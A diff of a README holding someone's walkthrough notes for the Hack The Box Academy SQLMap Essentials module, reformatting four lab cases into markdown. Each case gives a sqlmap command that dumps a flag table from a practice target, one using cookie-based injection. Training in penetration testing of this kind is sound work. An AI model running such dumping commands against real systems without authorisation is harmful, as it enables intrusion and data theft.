@@ -1,21 +1,19 @@
-Hack The Box Academy – SQLMap Essentials: Walkthrough & Skills Assessment
-
 This repository contains my walkthrough and notes from the SQLMap Essentials module on Hack The Box Academy. The exercises and final assessment helped sharpen my skills in identifying and exploiting SQL Injection vulnerabilities using SQLMap.
 
-Module Exercises
+## Module Exercises ##
 
-Case 1: Basic Dump
-
+## Case 1: Basic Dump ##
+```bash 
 sqlmap -r Case1.txt --threads 10 --dump -T flag1 -D testdb --dbms=MySQL --batch
-
-Case 2: Simple Request
-
+```
+## Case 2: Simple Request ##
+```bash
 sqlmap -r Case2.txt --threads 10 --dump -T flag2 --batch
-
-Case 3: Cookie-Based Injection
-
+```
+## Case 3: Cookie-Based Injection ##
+```bash 
 sqlmap -r Case3.txt -p cookie --threads 10 --dump -T flag3 --batch
-
+```
 Case 4: Simple Dump
 
 sqlmap -r Case4.txt --threads 10 --dump -T flag4 --batch
